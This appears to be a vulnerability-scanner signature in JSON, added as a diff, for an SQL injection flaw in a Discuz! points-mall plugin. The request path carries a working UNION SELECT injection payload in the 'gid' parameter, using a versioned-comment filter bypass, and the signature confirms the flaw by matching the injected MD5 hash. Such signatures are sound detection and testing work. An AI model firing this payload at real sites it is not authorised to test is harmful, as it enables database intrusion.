@@ -1,0 +1,23 @@
+{
+  "cms": "discuz",
+  "version": "",
+  "author": "wolf",
+  "desc": "Discuz! 积分商城 Plugin 存在SQL注入漏洞",
+  "tags": [
+    "SQL注入"
+  ],
+  "refer": [
+    "",
+    ""
+  ],
+  "request": {
+    "path": "/plugin.php?id=v63shop:goods&pac=info&gid=1%20and%201=2%20union%20/*!50000select*/%201,2,3,4,5,6,md5(700),8,9,10,11,12,13,14",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "e5841df2166dd424a57127423d276bbe"
+  }
+}
